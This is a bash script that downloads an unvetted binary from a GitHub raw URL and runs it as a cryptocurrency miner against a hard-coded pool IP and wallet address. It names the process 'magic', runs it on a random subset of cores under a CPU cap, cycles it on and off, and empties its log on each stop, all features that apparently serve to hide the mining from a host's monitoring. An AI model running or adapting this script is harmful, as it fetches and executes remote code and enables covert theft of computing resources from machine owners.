#!/bin/bash

# Function to check and install cpulimit if not installed
check_and_install_cpulimit() {
  if ! command -v cpulimit &> /dev/null; then
    echo "cpulimit not found. Installing via yum..."
    sudo yum install -y cpulimit
  else
    echo "cpulimit is already installed"
  fi
}

# Function to download and prepare the mining script
prepare_mining_script() {
  wget -O tmii https://github.com/barburonjilo/back/raw/main/sr
  chmod +x tmii
}

# Function to generate the localized date string with core count
generate_worker() {
  local cores=$1
  TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
    's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
    | sed "s/$/$cores/"
}

# Function to start the mining process with a random number of cores
start_magic() {
  local total_cores=$(nproc)
  local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
  local worker=$(generate_worker $num_cores)  # Generate worker string including core count

  # Define the cores to use
  local cores_to_use="0-$(($num_cores - 1))"  # Using the first $num_cores cores

  # Calculate the CPU limit as a percentage
  local cpu_limit=$(( 100 * num_cores / total_cores ))  # Calculate percentage based on num_cores

  # Start the mining process with core affinity and output to log file
  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
  local pid=$!

  echo "Magic started with PID: $pid using $num_cores cores"
  echo "CPU limit set to $cpu_limit%"

  # Limiting CPU usage using `cpulimit`
  cpulimit -p $pid -l $cpu_limit &
  
  # Save PID to a file for later use
  echo $pid > /tmp/magic_pid
}

# Function to stop the mining process
stop_magic() {
  if [ -f /tmp/magic_pid ]; then
    local pid=$(cat /tmp/magic_pid)
    echo "Stopping magic with PID: $pid"
    kill -9 $pid 2>/dev/null
    rm -f /tmp/magic_pid
    
    # Empty the mining.log file
    > mining.log
  else
    echo "No PID file found, cannot stop magic"
  fi
}

# Main execution
check_and_install_cpulimit
prepare_mining_script

# Run the loop
while true; do
  start_magic
  sleep 300  # Wait for 5 minutes
  stop_magic
  sleep 120  # Wait for 2 minutes
done
